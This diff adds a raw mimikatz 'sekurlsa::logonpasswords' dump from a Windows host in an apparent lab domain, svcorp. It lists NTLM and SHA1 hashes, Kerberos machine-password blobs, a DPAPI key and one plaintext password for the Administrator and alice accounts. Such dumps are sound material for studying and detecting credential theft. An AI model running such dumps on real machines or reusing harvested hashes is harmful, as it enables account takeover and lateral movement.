@@ -1,0 +1,295 @@
+mimikatz # sekurlsa::logonpasswords > logon.txt
+
+Authentication Id : 0 ; 1838027 (00000000:001c0bcb)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 31/03/2021 16:07:45
+SID               : S-1-5-90-0-3
+        msv :
+         [00000003] Primary
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * NTLM     : 759894540750f872c32128a388f74f1b
+         * SHA1     : 138567d9341cbc0b75950458d5b42f376776029b
+        tspkg :
+        wdigest :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp.com
+         * Password : 22 26 8e ef 4a 5a e7 57 41 6e c1 c6 30 08 45 50 11 83 ff 72 c5 8e 4d 26 25 a7 96 04 9f 03 9d 27 55 fe c2 63 99 79 0b 97 be 41 93 21 43 d1 0d 6b 4d 44 50 da e6 22 8e 82 d9 7b 63 ef f3 52 48 e1 c7 99 ec 25 7d e5 c8 11 e6 53 e0 2c 47 6c 6a e7 c2 83 7b 6f 2e f0 4b 42 bf f0 96 b0 f0 55 32 82 8a ef e2 90 c6 c9 2b 67 55 2b 4b 9f f7 b7 4a b1 93 ab 01 17 a7 a1 1a 6a 83 04 1c ed 35 59 2f 9c 4c 8d 66 c6 ea e3 19 8f 2c c2 64 36 b3 2e 4e c8 a0 50 cb 59 3c b8 fa 2f d5 e3 7d d1 70 b4 fb da b7 2e ac 37 03 55 f1 34 c8 1f 93 57 de a7 ee 4f ef 43 a7 1c e1 be db 4e db 56 4b 94 41 7c f6 63 88 cb b0 a3 64 af 32 e1 d8 0f db fc 76 ff 97 4c d3 f4 bb fa af 57 4a c9 70 e9 a2 bd 09 7b be 55 0f 4a 4c 51 56 f4 f4 15 b6 95 25 27 21 8d 48 fe
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1838010 (00000000:001c0bba)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 31/03/2021 16:07:45
+SID               : S-1-5-90-0-3
+        msv :
+         [00000003] Primary
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * NTLM     : 759894540750f872c32128a388f74f1b
+         * SHA1     : 138567d9341cbc0b75950458d5b42f376776029b
+        tspkg :
+        wdigest :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp.com
+         * Password : 22 26 8e ef 4a 5a e7 57 41 6e c1 c6 30 08 45 50 11 83 ff 72 c5 8e 4d 26 25 a7 96 04 9f 03 9d 27 55 fe c2 63 99 79 0b 97 be 41 93 21 43 d1 0d 6b 4d 44 50 da e6 22 8e 82 d9 7b 63 ef f3 52 48 e1 c7 99 ec 25 7d e5 c8 11 e6 53 e0 2c 47 6c 6a e7 c2 83 7b 6f 2e f0 4b 42 bf f0 96 b0 f0 55 32 82 8a ef e2 90 c6 c9 2b 67 55 2b 4b 9f f7 b7 4a b1 93 ab 01 17 a7 a1 1a 6a 83 04 1c ed 35 59 2f 9c 4c 8d 66 c6 ea e3 19 8f 2c c2 64 36 b3 2e 4e c8 a0 50 cb 59 3c b8 fa 2f d5 e3 7d d1 70 b4 fb da b7 2e ac 37 03 55 f1 34 c8 1f 93 57 de a7 ee 4f ef 43 a7 1c e1 be db 4e db 56 4b 94 41 7c f6 63 88 cb b0 a3 64 af 32 e1 d8 0f db fc 76 ff 97 4c d3 f4 bb fa af 57 4a c9 70 e9 a2 bd 09 7b be 55 0f 4a 4c 51 56 f4 f4 15 b6 95 25 27 21 8d 48 fe
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 631773 (00000000:0009a3dd)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : SVCLIENT08
+Logon Server      : SVCLIENT08
+Logon Time        : 31/03/2021 15:17:49
+SID               : S-1-5-21-237104100-2676777109-815765336-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : SVCLIENT08
+         * NTLM     : ee0c207898a5bccc01f38115019ca2fb
+         * SHA1     : ef8a1ecb32d473d9d97d64d1eb5cd55efbb3d6bc
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : SVCLIENT08
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : SVCLIENT08
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 428584 (00000000:00068a28)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : SVCLIENT08
+Logon Server      : SVCLIENT08
+Logon Time        : 25/11/2020 15:33:28
+SID               : S-1-5-21-237104100-2676777109-815765336-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : SVCLIENT08
+         * NTLM     : ee0c207898a5bccc01f38115019ca2fb
+         * SHA1     : ef8a1ecb32d473d9d97d64d1eb5cd55efbb3d6bc
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : SVCLIENT08
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : SVCLIENT08
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 179881 (00000000:0002bea9)
+Session           : Interactive from 1
+User Name         : alice
+Domain            : svcorp
+Logon Server      : SV-DC01
+Logon Time        : 25/11/2020 15:29:22
+SID               : S-1-5-21-466546139-763938477-1796994327-1103
+        msv :
+         [00000003] Primary
+         * Username : alice
+         * Domain   : svcorp
+         * NTLM     : 7f004ce6b8f7b2a3b6c477806799b9c0
+         * SHA1     : 42024899f39a57b4b8e2cc8a6135344c6d97f0b4
+         * DPAPI    : 61b2fe5324370982157e36116d6f2a4c
+        tspkg :
+        wdigest :
+         * Username : alice
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : alice
+         * Domain   : SVCORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+         [00000000]
+         * Username : alice
+         * Domain   : alice
+         * Password : ThisIsTheUsersPassword01
+
+Authentication Id : 0 ; 179857 (00000000:0002be91)
+Session           : Interactive from 1
+User Name         : alice
+Domain            : svcorp
+Logon Server      : SV-DC01
+Logon Time        : 25/11/2020 15:29:22
+SID               : S-1-5-21-466546139-763938477-1796994327-1103
+        msv :
+         [00000003] Primary
+         * Username : alice
+         * Domain   : svcorp
+         * NTLM     : 7f004ce6b8f7b2a3b6c477806799b9c0
+         * SHA1     : 42024899f39a57b4b8e2cc8a6135344c6d97f0b4
+         * DPAPI    : 61b2fe5324370982157e36116d6f2a4c
+        tspkg :
+        wdigest :
+         * Username : alice
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : alice
+         * Domain   : SVCORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+         [00000000]
+         * Username : alice
+         * Domain   : alice
+         * Password : ThisIsTheUsersPassword01
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 25/11/2020 15:29:08
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 62800 (00000000:0000f550)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 25/11/2020 15:29:08
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * NTLM     : afe7034f5d8f2b4f79c1fd694ec0629c
+         * SHA1     : a962d3a3a81b979a8bfe4d6f9ee258bb6da278bc
+        tspkg :
+        wdigest :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp.com
+         * Password : 22 c4 1d ee 8b 47 03 c9 a7 5e 6a 0f 0e e7 1e f4 0f b1 34 c4 4c e3 b9 43 d7 d4 19 59 72 7f c8 26 19 24 6b 3a 89 85 51 b0 07 e3 56 98 30 75 5b 3e 45 bb 44 90 7b d0 63 43 fd 5c eb 46 7d b6 a8 59 a8 c8 35 ea d4 98 58 e2 ef 03 86 1e f1 27 ce 74 db ba 0b e9 4a da db 92 f3 da e7 9d 48 10 2d 57 db a4 75 d9 17 78 45 4b 80 f0 04 3a 50 d6 b1 0e 9c f6 5f 4d 7e d9 12 9f 50 13 4b cf 3c ac a0 f6 77 8a 18 5a 2d 7b 17 f7 2c 9a 6f 78 3c aa 2f 29 55 38 ea 8d e1 9e 4f e6 3f ce 73 f3 7e a3 8c ed f7 c0 34 b5 4c 2a b8 8e 80 d0 58 82 f3 14 9d 9e f5 57 c0 48 62 27 08 d2 48 91 64 68 4e ef 43 80 89 b5 9d ee e1 e7 68 34 f4 2f c5 dd 93 89 c7 6d ba b5 57 92 d5 77 09 2d 7e bf ab 55 e7 4c f4 95 3a a6 a9 d2 43 4b 2f 45 07 fd 35 83 51 dc ca 4f
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 62679 (00000000:0000f4d7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 25/11/2020 15:29:08
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * NTLM     : 759894540750f872c32128a388f74f1b
+         * SHA1     : 138567d9341cbc0b75950458d5b42f376776029b
+        tspkg :
+        wdigest :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp.com
+         * Password : 22 26 8e ef 4a 5a e7 57 41 6e c1 c6 30 08 45 50 11 83 ff 72 c5 8e 4d 26 25 a7 96 04 9f 03 9d 27 55 fe c2 63 99 79 0b 97 be 41 93 21 43 d1 0d 6b 4d 44 50 da e6 22 8e 82 d9 7b 63 ef f3 52 48 e1 c7 99 ec 25 7d e5 c8 11 e6 53 e0 2c 47 6c 6a e7 c2 83 7b 6f 2e f0 4b 42 bf f0 96 b0 f0 55 32 82 8a ef e2 90 c6 c9 2b 67 55 2b 4b 9f f7 b7 4a b1 93 ab 01 17 a7 a1 1a 6a 83 04 1c ed 35 59 2f 9c 4c 8d 66 c6 ea e3 19 8f 2c c2 64 36 b3 2e 4e c8 a0 50 cb 59 3c b8 fa 2f d5 e3 7d d1 70 b4 fb da b7 2e ac 37 03 55 f1 34 c8 1f 93 57 de a7 ee 4f ef 43 a7 1c e1 be db 4e db 56 4b 94 41 7c f6 63 88 cb b0 a3 64 af 32 e1 d8 0f db fc 76 ff 97 4c d3 f4 bb fa af 57 4a c9 70 e9 a2 bd 09 7b be 55 0f 4a 4c 51 56 f4 f4 15 b6 95 25 27 21 8d 48 fe
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SVCLIENT08$
+Domain            : svcorp
+Logon Server      : (null)
+Logon Time        : 25/11/2020 15:29:08
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * NTLM     : 759894540750f872c32128a388f74f1b
+         * SHA1     : 138567d9341cbc0b75950458d5b42f376776029b
+        tspkg :
+        wdigest :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : svclient08$
+         * Domain   : SVCORP.COM
+         * Password : 22 26 8e ef 4a 5a e7 57 41 6e c1 c6 30 08 45 50 11 83 ff 72 c5 8e 4d 26 25 a7 96 04 9f 03 9d 27 55 fe c2 63 99 79 0b 97 be 41 93 21 43 d1 0d 6b 4d 44 50 da e6 22 8e 82 d9 7b 63 ef f3 52 48 e1 c7 99 ec 25 7d e5 c8 11 e6 53 e0 2c 47 6c 6a e7 c2 83 7b 6f 2e f0 4b 42 bf f0 96 b0 f0 55 32 82 8a ef e2 90 c6 c9 2b 67 55 2b 4b 9f f7 b7 4a b1 93 ab 01 17 a7 a1 1a 6a 83 04 1c ed 35 59 2f 9c 4c 8d 66 c6 ea e3 19 8f 2c c2 64 36 b3 2e 4e c8 a0 50 cb 59 3c b8 fa 2f d5 e3 7d d1 70 b4 fb da b7 2e ac 37 03 55 f1 34 c8 1f 93 57 de a7 ee 4f ef 43 a7 1c e1 be db 4e db 56 4b 94 41 7c f6 63 88 cb b0 a3 64 af 32 e1 d8 0f db fc 76 ff 97 4c d3 f4 bb fa af 57 4a c9 70 e9 a2 bd 09 7b be 55 0f 4a 4c 51 56 f4 f4 15 b6 95 25 27 21 8d 48 fe
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 34524 (00000000:000086dc)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 25/11/2020 15:29:07
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * NTLM     : 759894540750f872c32128a388f74f1b
+         * SHA1     : 138567d9341cbc0b75950458d5b42f376776029b
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SVCLIENT08$
+Domain            : svcorp
+Logon Server      : (null)
+Logon Time        : 25/11/2020 15:29:07
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : SVCLIENT08$
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : svclient08$
+         * Domain   : SVCORP.COM
+         * Password : 22 26 8e ef 4a 5a e7 57 41 6e c1 c6 30 08 45 50 11 83 ff 72 c5 8e 4d 26 25 a7 96 04 9f 03 9d 27 55 fe c2 63 99 79 0b 97 be 41 93 21 43 d1 0d 6b 4d 44 50 da e6 22 8e 82 d9 7b 63 ef f3 52 48 e1 c7 99 ec 25 7d e5 c8 11 e6 53 e0 2c 47 6c 6a e7 c2 83 7b 6f 2e f0 4b 42 bf f0 96 b0 f0 55 32 82 8a ef e2 90 c6 c9 2b 67 55 2b 4b 9f f7 b7 4a b1 93 ab 01 17 a7 a1 1a 6a 83 04 1c ed 35 59 2f 9c 4c 8d 66 c6 ea e3 19 8f 2c c2 64 36 b3 2e 4e c8 a0 50 cb 59 3c b8 fa 2f d5 e3 7d d1 70 b4 fb da b7 2e ac 37 03 55 f1 34 c8 1f 93 57 de a7 ee 4f ef 43 a7 1c e1 be db 4e db 56 4b 94 41 7c f6 63 88 cb b0 a3 64 af 32 e1 d8 0f db fc 76 ff 97 4c d3 f4 bb fa af 57 4a c9 70 e9 a2 bd 09 7b be 55 0f 4a 4c 51 56 f4 f4 15 b6 95 25 27 21 8d 48 fe
+        ssp :
+        credman :
